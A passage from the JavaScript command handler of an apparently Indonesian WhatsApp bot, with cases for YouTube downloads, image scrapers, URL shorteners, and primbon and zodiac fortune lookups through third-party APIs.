📀 ID : ${anu.videoId}
⏳ Duration : ${anu.timestamp}
👁️ Viewers : ${anu.views}
📤 Upload At : ${anu.ago}
👨‍🎤 Author : ${anu.author.name}
💻 Channel : ${anu.author.url}
💬 Description : ${anu.description}
🔗 Url : ${anu.url}`,
                    footer: danta.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                danta.sendMessage(m.chat, buttonMessage, {
                    quoted: fvideo
                })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                danta.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                danta.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
case 'internetmenu':
			 let sectioans = [
                {
                title: "Internet Menu",
                rows: [
				{title: "GSMArena Info", rowId: `gsmarena`, description: `Mencari info HP. Usage: .gsmarena [query]`},
				{title: "Jadwal Bioskop", rowId: `jadwalbioskop`, description: `Jadwal film bioskop hari ini. Usage: .jadwalbioskop [kota]`},
				{title: "Now Playing Bioskop", rowId: `nowplayingbioskop`, description: `Film bioskop hari ini di Indonesia`},
				{title: "Wattpad", rowId: `wattpad`, description: `Mencari novel dari wattpad. Usage: .wattpad [query]`},
				{title: "Webtoons", rowId: `webtoons`, description: `Mencari komik dari webtoon. Usage: .webtoon [query]`},
				{title: "Info Cuaca", rowId: `cuaca`, description: `Info cuaca dari kota. Usage: .cuaca [kota]`},
				{title: "weather", rowId: `weather`, description: `weather dari negara. Usage: .weather [negara]`},
				{title: "tr", rowId: `tr`, description: `contoh .tr apa kabar`},
				]
				},
				]
				 danta.sendListMsg(m.chat, `*Silahkan Pilih Menu Dibawah Ini*`, `Danta Dev`, `DOWNLOAD MENU`, `Click Here`, sectioans, m)
				break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                danta.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                danta.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                danta.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                danta.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                danta.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
            }
            break
            case 'waifu': {
            	m.reply(mess.wait)
                anu = await fetchJson(`https://waifu.pics/api/sfw/waifu`)
                buffer = await getBuffer(anu.url)
                let buttons = [{buttonId: `waifu`, buttonText: {displayText: 'Next Image'}, type: 1},{buttonId: `simplemenu`, buttonText: {displayText: '⬅️Back'}, type: 1}]
                let buttonMessage = {
                    image: buffer,
                    caption: `Random Waifu`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'couple': {
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                danta.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                danta.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpapermuslim':
case 'wallpapercyberspace':
case 'wallpapermountain':
case 'wallpaperprogramming':
case 'wallpapertechnology':
anu = await fetchJson(`https://apidhani.herokuapp.com/api/other/${command}?apikey=${dhakey}`)
oke = await getBuffer(anu.result)
danta.sendMessage(m.chat, {text:"LOADING...."},{quoted: m})
break
            case 'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'gcsearch': {
              if (!text) throw 'Masukkan Query Title'
                anu = await fetchJson(`https://api.akuari.my.id/search/carigc?query=${text}`)
                n = anu.result
                result = n[Math.floor(Math.random() * n.length)]
                let jwbn = `*Nama : ${result.nama}\n*Link : ${result.link}*`
		let buttons = [{ buttonId: `gcsearch ${text}`, buttonText: { displayText: 'Next' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, jwbn, nyoutube, m, {quoted: fgclink})
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tinyurl': case 'isgd': case 'vurl': case 'clp': {
            	if (!text) throw 'Masukkan Query Title'
                let anu = await fetchJson(`https://api.akuari.my.id/short/${command}?link=${text}`)
                let buttons = [
                    {buttonId: `hehehe`, buttonText: {displayText: '🙏THANKS'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.hasil,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: fdoc })
            }
            break
            
//Pembatas========================================
            case 'quotesanime': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}' \n\nAnime : ${result.anime}\n\n- ${result.up_at}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': {
                let anu = await fetchJson(`https://kocakz.herokuapp.com/api/random/text/quotes`)
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.quote,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                danta.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6281356484612`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'stickerpin': case 'pinstick': case 'pintereststicker':{
   if (!text) return danta.reply('Cari gambar apa?')
     danta.sendMessage(m.chat, { react: { text: "⏱️", key: danta.key }})
     try{
   const pint = await pinterest(`${q}`)
     let xm_za = pint[Math.floor(Math.random() * pint.length)];
       console.log(xm_za)      
     let hek = await getBuffer(xm_za)
     let buffers = await writeExifImg(hek, { packname: SETTING.packname, author: SETTING.author })
       await danta.sendMessage(m.chat, { sticker: { url: buffers } }, { quoted: m })
       } catch (e) { e = String(e)
      reply('Tidak ditemukan!')
   }
  }
  break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
case 'trigger':
            case 'wanted':
            case 'wasted':
            case 'blur':
            case 'trash':
            case 'circle':
if ((isMedia && !danta.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : m
reply(mess.wait)
owgi = await danta.downloadMediaMessage(ger)
anu = await upload(owgi)
titid = await getBuffer(`https://meiky-xyz.herokuapp.com/api/wanted${command}?url=${anu}`)               
danta.sendMessage(from, image, {quoted : ftroli, caption: '_Success_'}) 
} else {
reply('_Fotonya mana kak?_')
}
break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example❗:\n${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika,1,2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka,7,7,2005,2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7,7,2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7,7,2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12,1,2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12,1,2022,28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                danta.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            
//PEMBATAS=======================================
	    case 'stalker': case 'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
